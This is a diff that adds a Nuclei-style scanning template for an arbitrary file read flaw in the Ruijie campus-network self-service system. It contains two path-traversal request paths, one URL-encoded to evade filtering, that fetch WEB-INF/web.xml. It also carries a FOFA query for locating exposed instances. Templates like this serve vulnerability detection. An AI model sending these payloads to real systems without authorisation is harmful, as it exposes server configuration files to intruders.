@@ -1,0 +1,29 @@
+id: ruijie-selfservice-login_judge-fileread
+
+info:
+  name: 锐捷校园网自助服务系统login_judge任意文件读取
+  author: onewin
+  severity: high
+  description: 锐捷校园网自助服务系统login_judge任意文件读取
+  metadata:
+    fofa-query: body="校园网自助服务系统"
+  tags: 校园网自助服务系统
+
+http:
+  - method: GET
+  - path:
+      - "{{BaseURL}}/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=../WEB-INF/web.xml"
+      - "{{BaseURL}}/selfservice/selfservice/module/scgroup/web/login_judge.jsf?vie%77=./WEB-INF/web.xml%3F"
+
+    stop-at-first-match: true
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - </web-app>
+        condition: and
+      - type: status
+        status:
+          - 200
